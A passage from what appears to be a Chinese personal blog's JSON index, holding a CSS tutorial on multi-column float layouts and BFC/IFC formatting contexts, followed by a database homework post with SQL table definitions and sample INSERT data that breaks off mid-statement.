class=&quot;header&quot;&gt;#header&lt;/div&gt;&lt;!--2.主体内容区container--&gt;&lt;div class=&quot;container&quot;&gt; &lt;div class=&quot;column center&quot;&gt;&lt;/div&gt; &lt;div class=&quot;column left&quot;&gt;&lt;/div&gt;&lt;!--设定公共类名--&gt; &lt;div class=&quot;column right&quot;&gt;&lt;/div&gt;&lt;/div&gt;&lt;!--3.尾部footer--&gt;&lt;div class=&quot;footer&quot;&gt;#footer&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 5.3.3 侧边栏布局可以在空位紧缺的界面内提供更多的快捷入口和用户操作，简化了操作层级。 两栏布局 左侧宽度固定，右侧自适应 123456789101112131415161718192021222324252627282930313233343536373839404142434445&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;两栏布局 左固定&lt;/title&gt; &lt;style&gt; *&#123; padding: 0; margin: 0; &#125; body&#123; font-size: 18px; min-width: 600px; &#125; .container&#123; width: 100%; overflow: hidden; &#125; .left&#123; width: 150px; height: 200px;/*实际开发中不要给出高度，高度由内容自行撑开*/ float: left; background-color: pink; color: white; position: relative; margin-right: -150px; &#125; .right&#123; width: 100%; height: 200px;/*实际开发中不要给出高度，高度右内容自行撑开*/ float: left; background-color: #87faf8; color: white; margin-left: 180px; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class=&quot;container&quot;&gt; &lt;div class=&quot;left&quot;&gt;左侧固定&lt;/div&gt; &lt;div class=&quot;right&quot;&gt;右侧自适应&lt;/div&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 右侧宽度固定，左侧自适应 1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;两栏布局 右固定左侧自适应&lt;/title&gt; &lt;style&gt; *&#123; padding: 0; margin: 0; &#125; body&#123; font-size: 18px; min-width: 600px; &#125; .container&#123; overflow: hidden; padding: 0 150px 0 0; &#125; .column&#123; height: 200px;/*实际开发中不要给出高度，高度右内容自行撑开*/ float: left; position: relative; &#125; .left&#123; width: 100%; background-color: pink; color: white; &#125; .right&#123; width: 150px; background-color: #87faf8; color: white; margin-left: -150px; left: 150px; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;div class=&quot;container&quot;&gt; &lt;div class=&quot;column left&quot;&gt;左侧自适应xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxsssssssssssssssssssssssssssssssssssssss&lt;/div&gt; &lt;div class=&quot;column right&quot;&gt;右侧固定&lt;/div&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 左右均固定 1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;两栏布局 左右均固定&lt;/title&gt; &lt;style&gt; *&#123; padding: 0; margin: 0; &#125; body&#123; font-size: 18px; min-width: 600px; &#125; .container&#123; overflow: hidden; width: 1200px; &#125; .column&#123; height: 500px;/*实际开发中不要给出高度，高度右内容自行撑开*/ float: left; font-size: 28px; position: relative; &#125; .left&#123; width: 560px; background-color: pink; color: white; &#125; .right&#123; width: 600px; background-color: #87faf8; color: white; float: right; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;div class=&quot;container&quot;&gt; &lt;div class=&quot;column left&quot;&gt;左侧固定&lt;/div&gt; &lt;div class=&quot;column right&quot;&gt;右侧固定&lt;/div&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 三栏布局 两端固定，中间自适应 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;三栏布局 左右均固定中间自适应&lt;/title&gt; &lt;style&gt; *&#123; padding: 0; margin: 0; &#125; .container&#123; overflow: hidden; padding: 0 200px; &#125; .column&#123; float: left; line-height: 200px; position: relative; &#125; .right,.left&#123; width: 200px; color: white; &#125; .left&#123; background-color: darkorange; margin-left: -100%; left: -200px; &#125; .right&#123; background-color: lime; margin-left: -200px; left: 200px; &#125; .center&#123; width: 100%; line-height: 200px; background-color: #8080f0; &#125; .content&#123; color: white; &#125; body&#123; min-width: 600px;/*很重要！！！！！*/ &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;div class=&quot;container&quot;&gt; &lt;div class=&quot;column center&quot;&gt; &lt;div class=&quot;content&quot;&gt;中间自适应&lt;/div&gt; &lt;/div&gt; &lt;div class=&quot;column left&quot;&gt;左侧固定&lt;/div&gt; &lt;div class=&quot;column right&quot;&gt;右侧固定&lt;/div&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 左侧自适应，中间、右侧固定 写法一 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;三栏布局 左侧自适应 中间右侧固定 写法2&lt;/title&gt; &lt;style&gt; *&#123; padding: 0; margin: 0; &#125; .container&#123; color: white; overflow: hidden; &#125; .left&#123; width: 100%; background-color: #8080ff; float: left; height: 200px; margin-right: -300px; /*重点和难点！！！！！*/ line-height: 200px; &#125; .right,.center&#123; float: right; width: 150px; height: 200px; line-height: 200px; &#125; .center&#123; background-color: yellow; &#125; .right&#123; background-color: deeppink; &#125; .content&#123; margin-right: 300px; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;div class=&quot;container&quot;&gt; &lt;div class=&quot;left&quot;&gt; &lt;div class=&quot;content&quot;&gt; 左侧自适应 左侧自适应 左侧自适应 左侧自适应 左侧自适应 左侧自适应 左侧自适应 左侧自适应 左侧自适应 左侧自适应 左侧自适应 左侧自适应 左侧自适应 &lt;/div&gt; &lt;/div&gt; &lt;div class=&quot;column right&quot;&gt;右侧固定&lt;/div&gt; &lt;div class=&quot;center&quot;&gt;中间固定&lt;/div&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 写法二 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;三栏布局 左侧自适应 中间右侧固定&lt;/title&gt; &lt;style&gt; *&#123; padding: 0; margin: 0; &#125; .container&#123; overflow: hidden; padding: 0 200px; &#125; .column&#123; float: left; line-height: 200px; position: relative; &#125; .left&#123; width: 100%; background-color: darkorange; left: -200px; &#125; .right&#123; background-color: lime; margin-left: -200px; left: 200px; width: 200px; color: white; &#125; .center&#123; width: 200px; line-height: 200px; background-color: #8080f0; margin-left: -200px; &#125; .content&#123; color: white; &#125; body&#123; min-width: 400px;/*很重要！！！！！*/ &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;div class=&quot;container&quot;&gt; &lt;div class=&quot;column left&quot;&gt;左侧自适应左侧自适应左侧自适应左侧自适应左侧自适应左侧自适应左侧自适应左侧自适应左侧自适应左侧自适应左侧自适应左侧自适应左侧自适应左侧自适应左侧自适应左侧自适应左侧自适应左侧自适应左侧自适应左侧自适应左侧自适应左侧自适应左侧自适应左侧自适应左侧自适应左侧自适应左侧自适应左侧自适应&lt;/div&gt; &lt;div class=&quot;column center&quot;&gt; &lt;div class=&quot;content&quot;&gt;中间固定&lt;/div&gt; &lt;/div&gt; &lt;div class=&quot;column right&quot;&gt;右侧固定&lt;/div&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 可以看出，它们都有各自的特点 右侧自适应，中间、左边固定 123456789101112131415161718192021222324252627282930313233343536373839404142434445&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;三栏布局 左侧固定中间固定 右侧自适应&lt;/title&gt; &lt;style&gt; *&#123; padding: 0; margin: 0; &#125; .container&#123; overflow: hidden; &#125; .left,.center&#123; color: white; width: 150px; height: 200px; line-height: 200px; float: left; &#125; .left&#123; background: chartreuse; &#125; .center&#123; background-color: blueviolet; &#125; .right&#123; background-color: yellow; color: red; height: 200px; line-height: 200px; width: 100%; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;div class=&quot;container&quot;&gt;&lt;div class=&quot;left&quot;&gt;左侧固定&lt;/div&gt;&lt;div class=&quot;center&quot;&gt;中间固定&lt;/div&gt;&lt;div class=&quot;right&quot;&gt; &lt;div class=&quot;content&quot;&gt;右侧自适应右侧自适应右侧自适应右侧自适应右侧自适应右侧自适应右侧自适应右侧自适应右侧自适应右侧自适应右侧自适应右侧自适应右侧自适应右侧自适应右侧自适应右侧自适应右侧自适应右侧自适应右侧自适应右侧自适应&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 5.4 BFC&amp;IFCFC：fomatting context格式上下文，CSS2.1中的概念，它是页面中的一块渲染区域，并且有一套渲染规则，它决定了其子元素将如何定位，以及和其他元素的关系和相互作用。BFC和IFC都是常见的FC，分别为Block Fomatting Context和Inline Fomatting Context。 5.4.1BFC — 块级格式化上下文 形成BFC的条件（满足一个即可） 必须是一个浮动元素（float除none之外的值） 定位元素（position中的absolute/fixed） display的值为inline-block/table-cell/table-caption overflow的值为hidden/auto/scroll BFC特性/规则 内部的盒子会在垂直方向一个接一个放置 垂直方向上的距离由会叠加，将由margin的最大值决定（如果不想要margin值叠加，需要将其变成一个独立的容器） BFC的区域不会与float元素区域重叠 计算BFC的高度时，浮动元素也参与计算 BFC就是页面上独立的一个容器，容器里面的元素不会影响到外面的元素 BFC的作用 解决margin重叠问题（添加独立BFC） 解决浮动高度塌陷父级未被撑开问题（在父级添加样式overflow:hidden） 解决侵占浮动元素的问题（添加overflow:hidden） 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;BFC规范&lt;/title&gt; &lt;style&gt; /*!*内部的盒子会在垂直方向一个接一个放置*!*/ /*.box1,.box2&#123;*/ /* width: 200px;*/ /* height: 200px;*/ /* border: 10px solid black;*/ /*&#125;*/ /*垂直方向上的距离由margin的最大值决定*/ /*如果不想要margin值叠加，需要将其变成一个独立的容器*/ /*.container&#123;*/ /* overflow: hidden;*/ /* width: 100px;*/ /* height: 100px;*/ /* background-color: red;*/ /*&#125;*/ /*.box1&#123;*/ /* margin: 20px 0;*/ /* height: 20px;*/ /* background-color: greenyellow;*/ /*&#125;*/ /*.box2&#123;*/ /* margin: 10px 0;*/ /* height: 20px;*/ /* background-color: cyan;*/ /*&#125;*/ /*!*BFC的区域不会与float元素区域重叠*!*/ /*.box1&#123;*/ /* float: left;*/ /* width: 200px;*/ /* height: 100px;*/ /* background-color: greenyellow;*/ /*&#125;*/ /*.box2&#123;*/ /* overflow: hidden;*/ /* height: 200px;*/ /* background-color: red;*/ /*&#125;*/ /*计算BFC的高度时，浮动元素也参与计算*/ .box2&#123; width: 200px; height: 100px; background-color: greenyellow; float: left; &#125; .container&#123; width: 300px; border: 5px solid black; overflow: hidden;/*如果想让父级也被撑开，就必须把它设置成一个BFC*/ &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;div class=&quot;container&quot;&gt; &lt;div class=&quot;box1&quot;&gt;&lt;/div&gt; &lt;div class=&quot;box2&quot;&gt;&lt;/div&gt;&lt;/div&gt;&lt;!--&lt;div class=&quot;container&quot;&gt;--&gt;&lt;!-- &lt;div class=&quot;wrapper&quot;&gt;--&gt;&lt;!-- &lt;div class=&quot;box1&quot;&gt;&lt;/div&gt;&amp;lt;!&amp;ndash;如果不想要margin值叠加，需要将其变成一个独立的容器&amp;ndash;&amp;gt;--&gt;&lt;!-- &lt;/div&gt;--&gt;&lt;!-- &lt;div class=&quot;box2&quot;&gt;&lt;/div&gt;--&gt;&lt;!--&lt;/div&gt;--&gt;&lt;/body&gt;&lt;/html&gt; 5.4.2 IFC — 行级（内联）格式化上下文 形成IFC的条件 font-size line-height height vertical-height:top/middle/bottom IFC特性/规则 IFC的元素会在一行上从左至右排列 在一行上的所有元素会在该区域形成一个行框line box 行框的高度为包含框的高度，高度为行框中最高元素的高度 浮动的元素不会在行框中，并且浮动元素会压缩行框的宽度 行框的宽度容纳不下子元素时，字元素会自动换行显示，并且会产生新的行框 行框的元素内遵循text-align和vertical-align 从上到下的四条线：顶线 中线 基线 底线，行高是指上下文本行的基线间的垂直距离。 容器高度height=line-height+vertical-align 1234567891011121314151617181920212223242526272829303132333435&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;IFC特性/规范&lt;/title&gt; &lt;style&gt; *&#123; padding: 0; margin: 0; &#125; /*IFC的元素会在一行上从左至右排列*/ span&#123; font-size: 30px; background-color: greenyellow; /*width: 300px;!*注意行级标签不识别宽高，实在要改，可以用display更改*!*/ /*display: inline-block;*/ &#125; strong&#123; background-color: lightpink; font-size: 18px; vertical-align: top; &#125; .box&#123; float: left; font-size: 50px; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;span&gt;span&lt;/span&gt; &lt;strong&gt;strong&lt;/strong&gt; &lt;em class=&quot;box&quot;&gt;box&lt;/em&gt;&lt;/body&gt;&lt;/html&gt; 5.5 实训1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;第五次实训&lt;/title&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;./CSS/作业五.css&quot;&gt; &lt;link rel=&quot;Shortcut Icon&quot; href=&quot;./imgs/img.png&quot; &gt;&lt;/head&gt;&lt;body&gt;&lt;!--页面--&gt;&lt;div class=&quot;mysite&quot;&gt; &lt;!--头部--&gt; &lt;div class=&quot;head&quot;&gt; &lt;a href=&quot;#&quot;&gt;&lt;img src=&quot;./imgs/三国杀二乔.jpg&quot; alt=&quot;三国杀&quot;&gt;&lt;/a&gt; &lt;a href=&quot;#&quot;&gt;&lt;img src=&quot;./imgs/三国杀夏侯氏.png&quot; alt=&quot;三国杀&quot;&gt;&lt;/a&gt; &lt;/div&gt; &lt;div class=&quot;banner&quot;&gt; &lt;div&gt;&lt;ul class=&quot;main&quot;&gt; &lt;li&gt;&lt;a href=&quot;&quot;&gt;主页&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;&quot;&gt;我的英雄&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;&quot;&gt;战绩&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;&quot;&gt;匹配&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;&quot;&gt;排位&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;&quot;&gt;好友&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;&quot;&gt;商店&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;&quot;&gt;故事&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt;&lt;/div&gt; &lt;div&gt; &lt;ul class=&quot;sub&quot;&gt; &lt;li&gt;&lt;a href=&quot;#&quot;&gt;导航1&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;#&quot;&gt;导航2&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;#&quot;&gt;导航3&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;#&quot;&gt;导航4&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;#&quot;&gt;导航5&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;#&quot;&gt;导航6&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt;&lt;/div&gt; &lt;!--主体部分--&gt; &lt;/div&gt; &lt;div class=&quot;content&quot;&gt; &lt;div class=&quot;left&quot;&gt;&lt;!--侧栏--&gt; &lt;ul class=&quot;sides&quot;&gt; &lt;li&gt;&lt;a href=&quot;&quot;&gt;文章索引1&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;&quot;&gt;文章索引2&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;&quot;&gt;文章索引3&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;&quot;&gt;文章索引4&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;&quot;&gt;文章索引5&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;&quot;&gt;文章索引6&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;&quot;&gt;文章索引7&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;&quot;&gt;文章索引8&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;&quot;&gt;文章索引9&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;&quot;&gt;文章索引10&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;&quot;&gt;文章索引11&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;&quot;&gt;文章索引12&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt;&lt;/div&gt; &lt;!--内容区--&gt; &lt;div class=&quot;main&quot;&gt; &lt;h2&gt; 习近平反复强调这个高校立身&lt;/h2&gt; &lt;div&gt; 4月6日，习近平总书记致信祝贺厦门大学建校100周年，向全体师生员工和海内外校友致以热烈的祝贺和诚挚的问候。 &lt;/div&gt; &lt;div&gt;总书记在贺信中指出，我国已开启全面建设社会主义现代化国家新征程。希望厦门大学全面贯彻党的教育方针，切实落实立德树人根本任务，为党育人、为国育才，与时俱进建设世界一流大学。&lt;/div&gt; &lt;div&gt;“高校立身之本在于立德树人。”党的十八大以来，习近平总书记高度重视高等教育事业发展，多次强调立德树人这个根本任务，指出只有培养出一流人才的高校，才能够成为世界一流大学。&lt;/div&gt; &lt;div&gt;央视网《联播+》特梳理总书记在考察、会议、回信中对高校关于“立德树人”的要求和嘱托，一起感受总书记对教育事业的深深牵挂&lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;!--尾部--&gt; &lt;div class=&quot;footer&quot;&gt; &lt;/div&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182*&#123; padding: 0; margin: 0;&#125;body&#123; font-size: 18px; background-color: lightgray;&#125;.mysite&#123; width: 1000px; margin: 0 auto;&#125;img&#123; width: 20%;&#125;img[src=&quot;./imgs/三国杀二乔.jpg&quot;]&#123; border-right: #8080ff 5px solid;&#125;.banner&#123; border-bottom: #87faf8 solid 2px;&#125;.banner ul.main&#123; list-style: none; width: 100%; background-color: #8080ff;&#125;.banner ul li&#123; margin: 15px auto; display: inline-block; padding: 0 30px 0 20px; border-right: red 1px solid;&#125;.banner ul li:last-child&#123;/*伪元素选择器*/ border-right: none;&#125;ul li a&#123; text-decoration: none; color: white;&#125;ul li a:hover&#123; color: red;&#125;ul li a:active&#123; color: #87faf8;&#125;.banner ul.sub&#123; list-style: none;&#125;.banner ul.sub li&#123; margin: 0 25px;&#125;.content&#123; overflow: hidden;&#125;.left&#123; float: left; margin-right: 20px; position: relative;&#125;.main&#123; width: 800px; float: left;&#125;.sides&#123; background-color: black; width: 100px;&#125;.content ul.sides&#123; list-style: none;&#125;.content ul.sides li&#123; padding: 10px 0;&#125;h2&#123; border-bottom: black solid 2px; margin: 10px 0 10px 0;&#125;.main div&#123; margin: 0 0 20px 0;&#125;","categories":[],"tags":[{"name":"CSS","slug":"CSS","permalink":"https://github.com/zhangjialin996/zhangjialin996.github.io/tags/CSS/"}]},{"title":"数据库第三章实践作业","slug":"数据库作业1","date":"2021-03-27T13:08:49.000Z","updated":"2021-05-28T09:20:02.664Z","comments":true,"path":"2021/03/27/数据库作业1/","link":"","permalink":"https://github.com/zhangjialin996/zhangjialin996.github.io/2021/03/27/%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BD%9C%E4%B8%9A1/","excerpt":"","text":"教材：《数据库系统原理、设计与编程》陆鑫 张凤荔 陈安龙/编著 第三章 数据库操作语言SQL 课后习题五、实践操作题作业--创建三张表CREATE TABLE &quot;Owner&quot;(&quot;PersonID&quot; char(18) PRIMARY KEY, &quot;Name&quot; varchar(20) NOT NULL, &quot;Gender&quot; char(2) NOT NULL, &quot;Occupation&quot; varchar(20) NOT NULL, &quot;Addr&quot; varchar(50) NOT NULL, &quot;Tel&quot; varchar(11) NOT NULL);CREATE TABLE &quot;Estate&quot;(&quot;EstateID&quot; char(15) NOT NULL PRIMARY KEY, &quot;EstateName&quot; varchar(50) NOT NULL, &quot;EstateBuildName&quot; varchar(50) NOT NULL, &quot;EstateAddr&quot; varchar(60) NOT NULL, &quot;EstateCity&quot; varchar(60) NOT NULL, &quot;EstateType&quot; char(4) NOT NULL CHECK(&quot;EstateType&quot; IN(&#x27;住宅&#x27;,&#x27;商铺&#x27;,&#x27;车位&#x27;,&#x27;别墅&#x27;)), &quot;ProPertyArea&quot; numeric(5,2) NOT NULL, &quot;UsableArea&quot; numeric(5,2) NOT NULL, &quot;CompletedDate&quot; date NOT NULL, &quot;YearLength&quot; int NOT NULL DEFAULT 70, &quot;Remark&quot; varchar(100) NULL);create table &quot;Registration&quot;(&quot;RegisterID&quot; int NOT NULL PRIMARY KEY, &quot;PersonID&quot; char(18) NOT NULL, &quot;EstateID&quot; char(15) NOT NULL, &quot;Price&quot; money NOT NULL, &quot;PurchasedDate&quot; date NOT NULL, &quot;DeliverDate&quot; date NOT NULL, CONSTRAINT PersonID_FK FOREIGN KEY(&quot;PersonID&quot;) REFERENCES &quot;Owner&quot;(&quot;PersonID&quot;) ON DELETE CASCADE, constraint EstateID_FK FOREIGN KEY(&quot;EstateID&quot;) REFERENCES &quot;Estate&quot;(&quot;EstateID&quot;) ON DELETE CASCADE)--数据库修改测试：ALTER TABLE &quot;Owner&quot; DROP COLUMN &quot;Tel&quot;;ALTER TABLE &quot;Owner&quot; ADD &quot;Tel&quot; varchar(11) NOT NULL;--插入数据--完善Owner表：INSERT INTO &quot;Owner&quot; VALUES(&#x27;510722200011268436&#x27;,&#x27;诸慧&#x27;,&#x27;女&#x27;,&#x27;学生&#x27;,&#x27;四川绵阳市&#x27;,&#x27;15596543698&#x27;);INSERT INTO &quot;Owner&quot; VALUES(&#x27;110221200301012836&#x27;,&#x27;周共&#x27;,&#x27;男&#x27;,&#x27;学生&#x27;,&#x27;北京市&#x27;,&#x27;15832956645&#x27;);INSERT INTO &quot;Owner&quot; VALUES(&#x27;370503198904032299&#x27;,&#x27;张三&#x27;,&#x27;男&#x27;,&#x27;律师&#x27;,&#x27;山东营口市&#x27;,&#x27;13945236544&#x27;);INSERT INTO &quot;Owner&quot; VALUES(&#x27;440402199804078098&#x27;,&#x27;刘潜&#x27;,&#x27;男&#x27;,&#x27;服务员&#x27;,&#x27;广东珠江市&#x27;,&#x27;13646986566&#x27;);INSERT INTO &quot;Owner&quot; VALUES(&#x27;120223199401018302&#x27;,&#x27;关银屏&#x27;,&#x27;女&#x27;,&#x27;陆军&#x27;,&#x27;天津市&#x27;,&#x27;15932656565&#x27;);INSERT INTO &quot;Owner&quot; VALUES(&#x27;110221200301012617&#x27;,&#x27;曹笑&#x27;,&#x27;男&#x27;,&#x27;程序猿&#x27;,&#x27;四川成都市&#x27;,&#x27;15732696565&#x27;);INSERT INTO &quot;Owner&quot; VALUES(&#x27;360103199103012782&#x27;,&#x27;郭灵&#x27;,&#x27;女&#x27;,&#x27;教师&#x27;,&#x27;江西南昌市&#x27;,&#x27;15963556552&#x27;);INSERT INTO &quot;Owner&quot; VALUES(&#x27;320582199905175153&#x27;,&#x27;孙云&#x27;,&#x27;男&#x27;,&#x27;医生&#x27;,&#x27;江苏张家港市&#x27;,&#x27;13665623233&#x27;);--完善Estate表：INSERT INTO &quot;Estate&quot; VALUES(&#x27;A&#x27;,&#x27;承泰国际&#x27;,&#x27;三里花城新蕊公馆&#x27;,&#x27;绵阳&#x27;,&#x27;绵阳&#x27;,&#x27;住宅&#x27;,&#x27;120&#x27;,&#x27;110&#x27;,&#x27;2020/1/1&#x27;,&#x27;70&#x27;,NULL);INSERT INTO &quot;Estate&quot; VALUES(&#x27;B&#x27;,&#x27;万达国际&#x27;,&#x27;德商天骄城学府&#x27;,&#x27;北京&#x27;,&#x27;北京&#x27;,&#x27;别墅&#x27;,&#x27;700&#x27;,&#x27;653&#x27;,&#x27;2017/3/29&#x27;,&#x27;70&#x27;,NULL);INSERT INTO &quot;Estate&quot; VALUES(&#x27;C&#x27;,&#x27;东山府第&#x27;,&#x27;未来之城&#x27;,&#x27;营口&#x27;,&#x27;营口&#x27;,&#x27;住宅&#x27;,&#x27;120&#x27;,&#x27;113&#x27;,&#x27;2009/6/6&#x27;,&#x27;70&#x27;,NULL);INSERT INTO &quot;Estate&quot; VALUES(&#x27;D&#x27;,&#x27;浩华地产&#x27;,&#x27;雅居乐锦尚雅宸&#x27;,&#x27;深圳&#x27;,&#x27;深圳&#x27;,&#x27;别墅&#x27;,&#x27;450&#x27;,&#x27;423&#x27;,&#x27;2019/11/2&#x27;,&#x27;70&#x27;,NULL);INSERT INTO &quot;Estate&quot; VALUES(&#x27;E&#x27;,&#x27;承泰国际&#x27;,&#x27;蓝光未来&#x27;,&#x27;成都&#x27;,&#x27;成都&#x27;,&#x27;车位&#x27;,&#x27;20&#x27;,&#x27;15&#x27;,&#x27;2016/1/24&#x27;,&#x27;70&#x27;,NULL);INSERT INTO &quot;Estate&quot; VALUES(&#x27;F&#x27;,&#x27;浩华地产&#x27;,&#x27;人居柏云庭&#x27;,&#x27;成都&#x27;,&#x27;成都&#x27;,&#x27;住宅&#x27;,&#x27;260&#x27;,&#x27;232&#x27;,&#x27;2020/6/11&#x27;,&#x27;70&#x27;,NULL);INSERT INTO &quot;Estate&quot; VALUES(&#x27;G&#x27;,&#x27;万达国际&#x27;,&#x27;荣海乐府&#x27;,&#x27;南昌&#x27;,&#x27;南昌&#x27;,&#x27;商铺&#x27;,&#x27;190&#x27;,&#x27;172&#x27;,&#x27;2020/3/23&#x27;,&#x27;70&#x27;,NULL);INSERT INTO &quot;Estate&quot; VALUES(&#x27;H&#x27;,&#x27;东山府第&#x27;,&#x27;朗诗·峰境&#x27;,&#x27;苏州&#x27;,&#x27;苏州&#x27;,&#x27;商铺&#x27;,&#x27;200&#x27;,&#x27;183&#x27;,&#x27;2017/6/13&#x27;,&#x27;70&#x27;,NULL);INSERT INTO &quot;Estate&quot; VALUES(&#x27;I&#x27;,&#x27;承泰国际&#x27;,&#x27;皇都花圃&#x27;,&#x27;北京&#x27;,&#x27;北京&#x27;,&#x27;住宅&#x27;,&#x27;360&#x27;,&#x27;300&#x27;,&#x27;2000/10/16&#x27;,&#x27;70&#x27;,NULL);INSERT INTO &quot;Estate&quot; VALUES(&#x27;J&#x27;,&#x27;东山府第&#x27;,&#x27;红叶别墅&#x27;,&#x27;广州&#x27;,&#x27;广州&#x27;,&#x27;住宅&#x27;,&#x27;150&#x27;,&#x27;130&#x27;,&#x27;2003/3/16&#x27;,&#x27;70&#x27;,NULL);INSERT INTO &quot;Estate&quot; VALUES(&#x27;K&#x27;,&#x27;浩华地产&#x27;,&#x27;锦灏佳园&#x27;,&#x27;杭州&#x27;,&#x27;杭州&#x27;,&#x27;住宅&#x27;,&#x27;162&#x27;,&#x27;131&#x27;,&#x27;2008/2/13&#x27;,&#x27;70&#x27;,NULL);INSERT INTO &quot;Estate&quot; VALUES(&#x27;L&#x27;,&#x27;东山府第&#x27;,&#x27;云间水庄二期&#x27;,&#x27;上海&#x27;,&#x27;上海&#x27;,&#x27;别墅&#x27;,&#x27;500&#x27;,&#x27;450&#x27;,&#x27;2019/3/18&#x27;,&#x27;70&#x27;,NULL);INSERT INTO &quot;Estate&quot; VALUES(&#x27;M&#x27;,&#x27;承泰国际&#x27;,&#x27; 静安雅筑&#x27;,&#x27;北京&#x27;,&#x27;北京&#x27;,&#x27;商铺&#x27;,&#x27;200&#x27;,&#x27;150&#x27;,&#x27;2018/1/26&#x27;,&#x27;70&#x27;,NULL);INSERT INTO &quot;Estate&quot; VALUES(&#x27;N&#x27;,&#x27;万达国际&#x27;,&#x27; 学苑风仪&#x27;,&#x27;深圳&#x27;,&#x27;深圳&#x27;,&#x27;商铺&#x27;,&#x27;200&#x27;,&#x27;170&#x27;,&#x27;2016/11/3&#x27;,&#x27;70&#x27;,NULL);INSERT INTO &quot;Estate&quot; 